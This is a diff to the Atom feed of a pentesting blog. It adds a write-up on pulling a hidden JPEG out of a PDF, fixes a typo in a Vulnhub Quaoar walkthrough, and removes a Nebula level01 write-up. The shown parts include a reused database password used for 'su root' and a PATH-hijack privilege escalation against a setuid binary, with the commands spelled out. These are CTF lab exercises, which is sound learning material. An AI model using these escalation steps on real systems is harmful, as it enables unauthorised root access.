@@ -1,4 +1,78 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-08-19T18:13:05+02:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - Quaoar</title><link href="http://localhost:4000/vulnhub-quaoar/" rel="alternate" type="text/html" title="Vulnhub.com - Quaoar" /><published>2017-08-19T10:00:00+02:00</published><updated>2017-08-19T10:00:00+02:00</updated><id>http://localhost:4000/vulnhub-quaoar</id><content type="html" xml:base="http://localhost:4000/vulnhub-quaoar/">&lt;h1&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-09-10T16:50:00+02:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Gynvael Polish Mission 010</title><link href="http://localhost:4000/gynveal-mission-10-polish/" rel="alternate" type="text/html" title="Gynvael Polish Mission 010" /><published>2017-09-10T10:00:00+02:00</published><updated>2017-09-10T10:00:00+02:00</updated><id>http://localhost:4000/gynveal-mission-10-polish</id><content type="html" xml:base="http://localhost:4000/gynveal-mission-10-polish/">&lt;h1&gt;Mission&lt;/h1&gt;
+
+&lt;p&gt;Let's get back to work, and as Gynvael started streaming again, his mission should be great start. &lt;/p&gt;
+
+&lt;pre&gt;
+MISSION 010            goo.gl/oAdvWe                  DIFFICULTY: ███░░░░░░░ [3/10]
+┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅
+
+We've received PDF document, where apparently there's a hidden message.
+Would you help us find it?
+
+  https://goo.gl/wgt94W
+
+Good luck!
+&lt;/pre&gt;
+
+&lt;p&gt;I started this challenge by looking at the file with a hex editor. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/pdf_hex_editor.png&quot; alt=&quot;Hexdump&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After a few moments of searching, I've found the &lt;b&gt;JFIF&lt;/b&gt; segment and so, the whole structure of &lt;b&gt;JPG&lt;/b&gt; file. From that moment, I think we'll be able to extract it from the PDF and somehow recreate it. &lt;/p&gt;
+
+&lt;p&gt;Quick peek at &lt;a href=&quot;https://en.wikipedia.org/wiki/JPEG_File_Interchange_Format&quot;&gt;Wikipedia&lt;/a&gt; showed that whole JPG file is placed between &lt;code&gt;FF DA&lt;/code&gt; and &lt;code&gt;FF D9&lt;/code&gt; codes. &lt;/p&gt;
+
+&lt;table&gt;&lt;tr&gt;
+&lt;th colspan=&quot;3&quot; style=&quot;text-align:left&quot;&gt;JFIF file structure&lt;/th&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;th style=&quot;text-align:left&quot;&gt;Segment&lt;/th&gt;
+&lt;th style=&quot;text-align:left&quot;&gt;Code&lt;/th&gt;
+&lt;th style=&quot;text-align:left&quot;&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;SOI&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;FF D8&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Start of Image&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;JFIF-APP0&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;FF E0 &lt;i&gt;s1&lt;/i&gt; &lt;i&gt;s2&lt;/i&gt; 4A 46 49 46 00 ...&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;see below&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;JFXX-APP0&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;FF E0 &lt;i&gt;s1&lt;/i&gt; &lt;i&gt;s2&lt;/i&gt; 4A 46 58 58 00 ...&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;optional, see below&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td colspan=&quot;3&quot;&gt;… additional marker segments&lt;br /&gt;
+(for example SOF, DHT, COM)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;SOS&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;FF DA&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;Start of Scan&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;td&gt;compressed image data&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;EOI&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;FF D9&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;End of Image&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Now let's copy everything between these segments and add to a new file. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/hex_image.png&quot; alt=&quot;hex image&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Last step is to save this file as JPG image. By the way, here's the flag ;)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/gynvael-missions/pdf_flag.jpg&quot; alt=&quot;flag&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Write-Ups" /><summary type="html">Mission</summary></entry><entry><title type="html">Vulnhub.com - Quaoar</title><link href="http://localhost:4000/vulnhub-quaoar/" rel="alternate" type="text/html" title="Vulnhub.com - Quaoar" /><published>2017-08-19T10:00:00+02:00</published><updated>2017-08-19T10:00:00+02:00</updated><id>http://localhost:4000/vulnhub-quaoar</id><content type="html" xml:base="http://localhost:4000/vulnhub-quaoar/">&lt;h1&gt;Introduction&lt;/h1&gt;
 &lt;p&gt;Hello everyone, another week, another challenge from &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;. This time we're going to work on a short machine called &lt;b&gt;Quaoar&lt;/b&gt;. &lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Welcome to Quaoar
@@ -345,7 +419,7 @@ define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot
 /&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; MySQL database password &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/
 define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'rootpassword!'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;Wil it work? &lt;/p&gt;
+&lt;p&gt;Will it work? &lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@Quaoar:/var/www/wordpress$ &lt;/span&gt;su root
 su root
@@ -3657,66 +3731,4 @@ RUN /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 
 &lt;h1&gt;Last words&lt;/h1&gt;
 
-&lt;p&gt;It was really frustrating, long and amazingly fun machine. I really enjoyed solving the challenges, even though they were taking me a lot of time and few headaches. Thanks a lot to &lt;a href=&quot;https://3mrgnc3.ninja/&quot;&gt;&lt;b&gt;3mrgnc3&lt;/b&gt;&lt;/a&gt; for creating this challenge, and to &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;, for hosting it. Hope you had fun reading this, and as always... &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction</summary></entry><entry><title type="html">Nebula 01</title><link href="http://localhost:4000/nebula-1/" rel="alternate" type="text/html" title="Nebula 01" /><published>2017-06-07T02:00:00+02:00</published><updated>2017-06-07T02:00:00+02:00</updated><id>http://localhost:4000/nebula-1</id><content type="html" xml:base="http://localhost:4000/nebula-1/">&lt;h1&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;Let's start another challenge from Nebula machine and see what's our target this time. &lt;/p&gt;
-
-&lt;h1&gt;Challenge&lt;/h1&gt;
-
-&lt;p&gt;&lt;b&gt;About&lt;/b&gt;&lt;/p&gt;
-
-&lt;pre&gt;
-There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
-
-To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.
-&lt;/pre&gt;
-
-&lt;p&gt;&lt;b&gt;Code&lt;/b&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-#include &amp;lt;sys/types.h&amp;gt;
-#include &amp;lt;stdio.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;gid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;uid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/env echo and now what?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;&lt;b&gt;Solution&lt;/b&gt;&lt;/p&gt;
-
-&lt;p&gt;Firstly, from the code, we know that &lt;b&gt;/usr/bin/env&lt;/b&gt; will execute a program with the current enviroment. It includes a &lt;b&gt;$PATH&lt;/b&gt; variable, which stores information where programs can be found. That way we can change the $PATH to some other folder, containing &lt;b&gt;echo&lt;/b&gt; script. Then it will run the getflag program, just like in the previous level. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;level01@nebula:~$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/flag01
-&lt;span class=&quot;gp&quot;&gt;level01@nebula:/home/flag01$ &lt;/span&gt;ls -l
-total 8
--rwsr-x--- 1 flag01 level01 7322 2011-11-20 21:22 flag01&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;In addition, setuid bit is set, so it will run as the owner &lt;b&gt;flag01&lt;/b&gt;. Let's start from creating a tmp directory, which will be our fake one. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;level01@nebula:/home/flag01$ &lt;/span&gt;mkdir /tmp/level01&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we are able to create fake PATH using export command, and then create the fake echo program. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;level01@nebula:/home/flag01$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/tmp/level01:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;level01@nebula:/home/flag01$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;getflag&quot;&lt;/span&gt; &amp;gt; /tmp/level01/echo&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Don't forget about the execute permissions. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;level01@nebula:/home/flag01$ &lt;/span&gt;chmod +x /tmp/level01/echo&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And we're ready to go, and run this vulnerable program. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;level01@nebula:/home/flag01$ &lt;/span&gt;./flag01
-You have successfully executed getflag on a target account&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Another challenge completed! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Exploit Exercises" /><summary type="html">Introduction</summary></entry></feed>
+&lt;p&gt;It was really frustrating, long and amazingly fun machine. I really enjoyed solving the challenges, even though they were taking me a lot of time and few headaches. Thanks a lot to &lt;a href=&quot;https://3mrgnc3.ninja/&quot;&gt;&lt;b&gt;3mrgnc3&lt;/b&gt;&lt;/a&gt; for creating this challenge, and to &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt;, for hosting it. Hope you had fun reading this, and as always... &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction</summary></entry></feed>
